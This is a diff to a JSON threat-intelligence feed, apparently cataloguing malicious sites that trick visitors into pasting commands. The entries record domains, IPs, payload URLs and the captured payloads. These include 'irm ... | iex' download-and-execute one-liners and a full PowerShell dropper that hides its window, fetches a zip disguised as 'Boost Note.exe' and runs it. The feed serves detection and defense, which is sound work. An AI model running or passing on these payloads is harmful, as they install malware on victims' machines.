@@ -1,5 +1,48 @@
 [
   {
+    "UrlDomain": "oregonstate.edu.pl",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/3ebc229a76f38212",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/3ebc229a76f38212'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/3ebc229a76f38212"
+    ],
+    "ReportId": "cmwq3hj6925o90omluxfpwhhb",
+    "ScannedAt": "2026-11-21T07:37:02.011000+00:00"
+  },
+  {
+    "UrlDomain": "sulsonintl.com",
+    "DeliveryUrl": [
+      "makeverizyjar.info",
+      "lovezramexar.info",
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "185.146.167.202"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwq3hc8s25mj0oml7jzq2r5l",
+    "ScannedAt": "2026-11-21T07:36:53.112000+00:00"
+  },
+  {
     "UrlDomain": "apartmentsspecials.com",
     "DeliveryUrl": [
       "lovezramexar.info",
@@ -1955,25 +1998,5 @@
     ],
     "ReportId": "cmwncfvff1vtx0omlmny8da5y",
     "ScannedAt": "2026-11-19T09:24:22.692000+00:00"
-  },
-  {
-    "UrlDomain": "consultadetarotbarato.es",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "217.160.0.10"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwn90gcc1vsl0oml5gkbhzu1",
-    "ScannedAt": "2026-11-19T07:48:24.449000+00:00"
   }
 ]
